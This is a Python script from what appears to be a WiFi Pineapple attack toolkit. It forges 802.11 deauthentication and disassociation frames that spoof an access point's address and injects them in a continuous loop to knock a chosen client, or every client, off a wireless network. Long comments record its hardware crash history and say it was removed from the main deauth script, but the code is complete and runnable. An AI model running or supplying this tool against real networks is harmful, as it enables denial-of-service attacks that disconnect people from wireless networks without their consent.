#!/usr/bin/env python3
# raw_deauth.py - Second-radio raw 802.11 deauth injector for phy0 (the
# Pager's BUILT-IN 2.4GHz radio, wlan0mon) - runs ALONGSIDE the official
# PINEAPPLE_DEAUTH_CLIENT-based attack on phy1 (wlan1mon, the MT7921 USB
# radio deauth.sh already uses), giving genuine simultaneous two-radio
# pressure instead of one radio doing everything by itself.
#
# REMOVED FROM deauth.sh IN v9.0 - NOT WIRED INTO ANYTHING ANYMORE.
# Despite the memory/socket hardening below, this caused a REPEATED HARD
# HANG on real hardware (confirmed via persistent crash logging added
# specifically to investigate: the kernel went completely silent with no
# panic/oops trace right after this script started sending, meaning a
# genuine USB/firmware-level lockup in the mt76 chip requiring a manual
# power cycle to recover - not a soft, self-recovering crash). Kept here
# for reference/history only. deauth.sh's actual fix for the underlying
# problem (mesh networks resisting single-radio deauth) is CHASE MODE -
# tracking which AP a specific target has roamed to and prioritizing it,
# instead of trying to add more attack surface via a second radio. See
# deauth.sh's find_target_bssid()/run_multi_bssid_loop.
#
# WHY THIS EXISTS AT ALL: Hak5's own DEAUTH_CLIENT/EXAMINE_CHANNEL
# commands have no radio-select parameter (confirmed via their docs -
# syntax is just bssid/target/channel) - they always operate on whatever
# single radio PineAP itself manages (confirmed via Hak5's own
# PINEAPPLE_SET_BANDS doc: "typically wlan1mon - the tri-band monitor
# radio in the Pager"). There's no official way to point them at a SECOND
# radio. aircrack-ng's aireplay-ng (the standard tool for exactly this)
# isn't installed on this device and there's no internet access right now
# to install it (confirmed live - opkg downloads fail). scapy IS already
# installed (confirmed live, 2.5.0, at /mmc/usr/bin/python3.11 - see
# lib/common.sh's resolve_python3), so this builds the same real
# technique (craft real 802.11 deauth/disassoc frames, inject over a
# monitor-mode raw socket) directly with what's actually available.
#
# HONEST HARDWARE LIMITS (verified live, not assumed):
#   - phy0 (this radio) is 2.4GHz ONLY (`iw list` shows a single 2.4GHz
#     band, channels 1-11 usable - 12-14 disabled by regulatory domain).
#     No 5GHz, no 6GHz on this chip (mt76_wmac / built-in MT7628AN).
#   - phy1 (deauth.sh's radio, MT7921) is dual-band 2.4/5GHz WiFi 6 -
#     still no 6GHz (that needs a 6E-capable chip like MT7925, i.e. a
#     different/newer adapter - not a software limitation to fix here).
#   - phy0's monitor interface (wlan0mon) can't independently pick a
#     channel while wlan0 (a separate, unconnected managed-mode interface
#     on the SAME physical radio) is up - confirmed live ("Resource busy"
#     from `iw dev wlan0mon set channel`, went away the moment wlan0 was
#     brought down). This script's caller (deauth.sh) handles that: bring
#     wlan0 down before using this, bring it back up after - wlan0 is
#     never actually connected to anything, so this has no real side
#     effect on the Pager's own operation.
#
# LIVE INCIDENT HISTORY: an earlier version of this script (calling
# scapy's sendp() directly, in a loop) was tested once and the device
# became unreachable shortly after - required a reboot/reset recovery
# path. The most likely mechanical cause: sendp() opens AND CLOSES a raw
# PF_PACKET socket on every single call - with burst=3 (deauth+disassoc
# each) every 0.5s that's ~12 socket open/close cycles per second,
# expensive kernel-side work on a 251MB device with no headroom. This
# rewrite opens ONE raw socket up front (scapy's conf.L2socket) and reuses
# it for every send - the standard fix for exactly this class of scapy
# performance problem. Also added: an upfront memory check (refuses to
# start if free RAM is critically low), a rate cap (--burst is bounded),
# and unbuffered stderr output so a caller tailing the log sees activity
# immediately rather than after a buffer fills.
#
# This is a genuine resource-usage improvement over the version that
# crashed, but it has NOT been re-tested live against a real crash
# scenario - treat the first live run of this rewrite as a real test,
# not as "already proven safe". Watch device responsiveness during it.
#
# Usage: raw_deauth.py IFACE BSSID TARGET DURATION [BURST]
#   IFACE       monitor-mode interface to inject on (wlan0mon)
#   BSSID       AP's MAC (colon format) - frames are sent spoofing this
#                 as the source, the standard deauth-attack technique
#   TARGET      client MAC, or ff:ff:ff:ff:ff:ff for every client
#   DURATION    seconds to run, or 0 to run until killed
#   BURST       deauth+disassoc pairs sent per round (default 3, matches
#                 deauth.sh's own --burst default/reasoning, capped at 8)
import sys
import time

MIN_FREE_KB = 15000  # refuse to start below ~15MB free - leaves headroom
                      # for the rest of the system on a 251MB device
MAX_BURST = 8         # hard cap regardless of what's passed in


def free_kb():
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if line.startswith("MemAvailable:"):
                    return int(line.split()[1])
    except Exception:
        pass
    return None


def main():
    if len(sys.argv) < 5:
        print("usage: raw_deauth.py IFACE BSSID TARGET DURATION [BURST]", file=sys.stderr)
        sys.exit(1)

    iface, bssid, target, duration_s = sys.argv[1:5]
    burst = int(sys.argv[5]) if len(sys.argv) > 5 else 3
    burst = max(1, min(burst, MAX_BURST))
    duration = float(duration_s)

    avail = free_kb()
    if avail is not None and avail < MIN_FREE_KB:
        print(f"raw_deauth.py: refusing to start - only {avail}KB free RAM "
              f"(need {MIN_FREE_KB}KB headroom). Close other captures/attacks first.",
              file=sys.stderr)
        sys.exit(1)

    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Disas, conf
    except ImportError as e:
        print(f"raw_deauth.py: scapy import failed: {e}", file=sys.stderr)
        sys.exit(1)

    # Standard deauth-attack frame shape: addr1 = destination (the
    # target client, or broadcast for "every client"), addr2/addr3 =
    # the AP's own BSSID (spoofed as the source) - this is what makes the
    # target believe the disconnect came from its real AP. Reason code 7
    # ("Class 3 frame received from nonassociated station") is a standard,
    # plausible reason code - not load-bearing for the attack to work,
    # just needs to be a real value from the spec.
    deauth = bytes(RadioTap() / Dot11(addr1=target, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7))
    disas = bytes(RadioTap() / Dot11(addr1=target, addr2=bssid, addr3=bssid) / Dot11Disas(reason=7))

    # Open ONE raw socket and reuse it for every send, instead of sendp()
    # (which opens+closes a socket per call - the likely real cost behind
    # the earlier crash). This is the standard scapy pattern for
    # high-frequency sends.
    try:
        sock = conf.L2socket(iface=iface)
    except Exception as e:
        print(f"raw_deauth.py: failed to open raw socket on {iface}: {e}", file=sys.stderr)
        sys.exit(1)

    deadline = time.time() + duration if duration > 0 else None
    print(f"raw_deauth.py: sending on {iface} to {target} spoofing {bssid}, "
          f"burst {burst}, {avail}KB free RAM at start", file=sys.stderr)
    sys.stderr.flush()

    # RUNTIME memory watchdog, not just a start-time check: the two live
    # crash incidents both happened partway through a run, not at launch,
    # so a check that only runs once before the loop starts can't catch a
    # slow leak or a spike from something else on the device competing for
    # RAM mid-attack. Checking free_kb() is a cheap /proc/meminfo read -
    # doing it every round (every 0.5s) is not a meaningful cost next to
    # the actual packet sends, so there's no reason to only sample it
    # occasionally here (unlike the heartbeat print, which IS worth
    # throttling to avoid spamming the log).
    sent_rounds = 0
    try:
        while deadline is None or time.time() < deadline:
            a = free_kb()
            if a is not None and a < MIN_FREE_KB:
                print(f"raw_deauth.py: stopping - free RAM dropped to {a}KB "
                      f"(below {MIN_FREE_KB}KB safety threshold) after {sent_rounds} rounds",
                      file=sys.stderr)
                break
            try:
                for _ in range(burst):
                    sock.send(deauth)
                    sock.send(disas)
            except OSError as e:
                # A send-level failure (interface reset, driver error) is
                # a signal to stop cleanly, not crash-loop retrying against
                # a radio that's in a bad state.
                print(f"raw_deauth.py: send failed ({e}) - stopping after {sent_rounds} rounds", file=sys.stderr)
                break
            sent_rounds += 1
            # Periodic low-cost heartbeat so a caller tailing the log can
            # tell this is alive without flooding the log every 0.5s.
            if sent_rounds % 10 == 0:
                print(f"raw_deauth.py: {sent_rounds} rounds sent, {a}KB free", file=sys.stderr)
                sys.stderr.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass
    print("raw_deauth.py: stopped", file=sys.stderr)


if __name__ == "__main__":
    main()
